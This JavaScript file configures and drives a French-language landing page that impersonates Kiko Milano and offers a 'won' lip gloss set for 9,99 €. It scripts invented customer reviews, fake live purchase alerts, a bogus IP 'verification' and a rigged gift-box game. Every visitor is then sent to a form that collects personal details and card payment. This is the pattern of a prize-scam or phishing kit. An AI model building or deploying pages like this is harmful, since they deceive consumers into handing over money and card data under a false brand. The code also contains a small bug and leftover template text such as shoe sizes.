const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ],
  };

  const mainProduct = {
    header: "Nouveau | Économisez 29,00 €",
    name: "Ensemble Hydra 3D pour les lèvres Kiko Milano",
    oldPrice: "29,00 €",
    newPrice: "9,99 €",
    selectText: "",
    text: `
  
  <b>Gloss apaisant pour les lèvres - Kiko Milano 3D Hydra Lipgloss</b>
  <br><br>
  
  <b>Caractéristiques :</b>
  <br>

  - Texture lisse et non collante;<br>
  - Applicateur en feutre doux pour une application facile et uniforme<br>
  - Ne coule pas dans les crevasses et permet un tracé précis<br>
  - Large gamme de teintes magnifiques;<br>
  - Très durable;<br>
  - Couches avec différents effets : transparent, brillant, nacré, fortement pigmenté ;<br>
  - Contient un fragment de patrimoine<br>
  - Emballage compact élégant avec le logo de l'entreprise<br>
  - Testé dermatologiquement.<br>
  <br><br>
  <b>Pour profiter de votre remise personnalisée, répondez à quelques questions :</b>
  `,
  };

  const notifications = [
    {
      user: "Mia S*****",
      location: "Zagreb, Croatie",
      action: "Je viens de recevoir un excellent produit pour 9,99 € !",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Ema B******",
      location: "Split, Croatie",
      action: "Je viens de recevoir un excellent produit pour 9,99 € !",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Lucija",
      time: "il y a 1 jour",
      header: "Style !",
      image: "./assets/r_5.jpg",
      review:
        "Je suis amoureuse de ces gloss. Disponibles dans les teintes les plus populaires. Ils ont une texture très agréable et brillent beaucoup sur les lèvres. Je suis très satisfaite.",
    },
    {
      name: "Sara",
      time: "il y a 2 jours",
      header: "Kiko toujours super",
      image: "./assets/r_3.jpg",
      review:
        "Cet ensemble est vraiment cool, les gloss Kiko ont la meilleure texture, bon brillant.",
    },
    {
      name: "Nika",
      time: "il y a 3 jours",
      header: "Beau cadeau",
      image: "./assets/r_4.jpg",
      review:
        "Je l'ai commandé comme cadeau pour ma fille, elle veut des gloss Kiko depuis longtemps.",
    },
    {
      name: "Marta",
      time: "il y a 5 jours",
      header: "Chapeau à la mode irrésistible !",
      image: "./assets/r_6.jpeg",
      review: "Un superbe ensemble des teintes les plus populaires de gloss pour les lèvres.",
    },
    {
      name: "Petra",
      time: "il y a 9 jours",
      header: "Rien de moins que ce que j'attendais de Kiko.",
      image: "./assets/r_2.jpg",
      review:
        "Ce n'est pas la première fois que j'achète des cosmétiques Kiko Milano, toujours de qualité supérieure.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET ÉVALUATIONS",
    percent: "99%",
    rec: "recommandez ce produit",
  };

  const questions = {
    _of: "Question {1} sur {2} :",
    arr: [
      {
        q: "Avez-vous déjà utilisé des cosmétiques Kiko Milano ?",
        a: ["Oui", "Non"],
      },
      {
        q: "À quelle fréquence utilisez-vous du gloss pour les lèvres ?",
        a: ["Tous les jours", "Seulement les jours fériés", "Cela dépend de la situation"],
      },
      {
        q: "Pour qui commandez-vous cet ensemble ?",
        a: ["Pour moi", "Pour un ami", "Pour un membre de ma famille"],
      },
    ],
  };

  const check = {
    title: "Votre réponse sera vérifiée.",
    arr: [
      "Vous avez répondu à la question 3/3.",
      "Votre adresse IP ne permet pas de tirer des conclusions sur les demandes précédentes.",
      "Votre réponse a été vérifiée.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Félicitations, vous avez confirmé que vous êtes une personne réelle.",
        button: "OK",
        text: `
      <center>
      Aujourd'hui, {date}, vous avez la chance de gagner un ensemble Hydra 3D pour les lèvres Kiko Milano.
        <br><br>
      Tout ce que vous avez à faire est de choisir la bonne boîte-cadeau.
        <br><br>
      Vous avez 3 essais, bonne chance !
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "OK",
        text: `
      <center>
      Malheureusement, cette boîte-cadeau est vide ! Vous avez encore 2 essais, bonne chance !
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: "Félicitations ! Vous avez gagné !",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
        Vous avez gagné un "Ensemble Hydra 3D pour les lèvres Kiko Milano".
        </p>
        <br>
          1) Cliquez sur "OK" pour accéder à la page de livraison.
          <br><br>
          2) Remplissez le formulaire et payez pour recevoir votre ensemble.
          <br><br>
          3) Le colis sera livré sous 2 à 3 jours.
      </center>
    `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          field: "Prénom",
        },
        family: {
          field: "Nom de famille",
        },
        phone: {
          field: "Numéro de téléphone",
        },
        email: {
          field: "E-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          field: "Ville",
        },
        address: {
          field: "Adresse de livraison",
        },
        zip: {
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Conditions de paiement",
      creditCard: "Paiement en ligne par carte bancaire",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Résumé de la commande",
      oldPrice: "29,00 €",
      newPrice: "9,99 €",
      size: "Taille",
      subTotal: {
        title: "Valeur de la commande",
        amount: "9,99 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "9,99 €",
      },
      checkoutButton: "Passez votre commande",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "",
      miniImg: "./assets/P_1.webp",
      images: [
        "./assets/P_1.webp",
        "./assets/P_2.webp",
        "./assets/P_3.webp",
        "./assets/P_4.webp",
      ],
    },
  ];

  const footer = {
    cr: "© 2023 Kiko Milano. Tous droits réservés.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
